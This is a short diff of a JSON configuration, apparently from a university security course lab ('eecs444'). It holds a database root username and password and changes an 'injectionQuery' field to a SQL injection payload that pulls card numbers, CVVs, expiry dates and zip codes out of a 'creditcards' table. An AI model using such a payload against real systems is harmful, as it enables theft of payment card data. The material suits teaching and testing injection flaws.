@@ -11,6 +11,6 @@
         "name": "eecs444",
         "username": "root",
         "password": "g42wry1ky9l",
-        "injectionQuery": "';select * from creditcards where number <> '"
+        "injectionQuery": "';select concat('number: ', number, '<br/>cvv: ', cvv, '<br/>expdate: ', expmonth, '/', expyear, '<br/>zip: ', zip) as alias from creditcards where number <> '"
     }
 }
